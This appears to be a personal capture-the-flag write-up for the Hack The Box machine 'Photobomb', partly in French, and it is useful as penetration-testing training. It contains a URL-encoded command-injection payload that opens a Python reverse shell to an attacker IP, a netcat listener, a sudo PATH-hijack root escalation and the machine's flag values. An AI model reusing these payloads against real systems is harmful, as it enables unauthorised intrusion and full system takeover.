# Photobomb

[Link](https://app.hackthebox.com/machines/Photobomb)
[Spoiler](https://www.youtube.com/watch?v=aRhS3onyzZ8)

Goal: Use Burp Suite to intercept and redirect package


## Commands


```bash

%% 1. nmap sur le ip address 
nmap -sC -sV 

%% 2. Ajouter le ipadress dans le ip
vi /etc/hosts > <IP> photobomb.htb

%% 3. Regarder le fichier js pour obtenir les credentials (inspect page)
python3 dirsearch.py -e js -u https://photobomb.htb
http://pH0t0:b0Mb!@photobomb.htb/printer

5. create redirect useing reverse shell and url encoder
ifconfig % tun0: 10.10.15.27
nc -lvpn 12345

photo=almas-salakhov-VK7TCqcZTlw-unsplash.jpg&filetype=jpg;python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.15.27%22%2C12345%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27&dimensions=3000x2000

%% user.txt: 
cb6c0339e8762261cb16b77175078cbf

6. find flag by acceding to root
sudo -l
cd /opt/
./cleanup.sh
cd /tmp/
echo "/bin/bash -p" > find
chmod +x find
sudo PATH=/tmp:$PATH find
sudo PATH=/tmp:$PATH /opt/cleanup.sh
cd /root

%% root.txt
475765b89ceab23b31295269fa87ff79


```

# To remember

- [X] when performing nmap, if we see 'unrecognize url', add it to /etc/hosts
- [X] check js to see any redirection possible. If script accept */*; we can 
      add reverse shell script at the end




## Ressources

- https://www.revshells.com/
- https://www.urlencoder.org/



